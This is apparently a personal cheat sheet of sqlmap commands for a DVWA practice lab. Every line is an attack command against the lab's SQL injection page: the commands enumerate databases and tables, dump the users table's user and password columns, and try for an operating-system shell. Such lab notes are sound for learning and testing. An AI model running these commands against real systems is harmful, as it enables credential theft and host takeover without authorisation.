## sqlmap

#### Exports for examples

`export cookie="security=low; PHPSESSID=24bab7fed98b050870ff1c174db99d6e"`

`export request="http://10.37.129.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"`

##### Use cookie and URL Request to get current user
`sqlmap -u $request --cookie=$cookie -b --current-db --current-user`

##### Fetch all databases
`sqlmap -u $request --cookie=$cookie -b --dbs`

##### Fetch tables in (dvwa) database
`sqlmap -u $request --cookie=$cookie -D dvwa --tables`

##### Fetch (users) column information from (dvwa) database
`sqlmap -u $request --cookie=$cookie -D dvwa -T users --columns`

##### Fetch (users) column with user/password fields
`sqlmap -u $request --cookie=$cookie -D dvwa -T users -C user,password --dump`

##### Try opening a shell
`sqlmap -u $request --cookie=$cookie --os-shell`
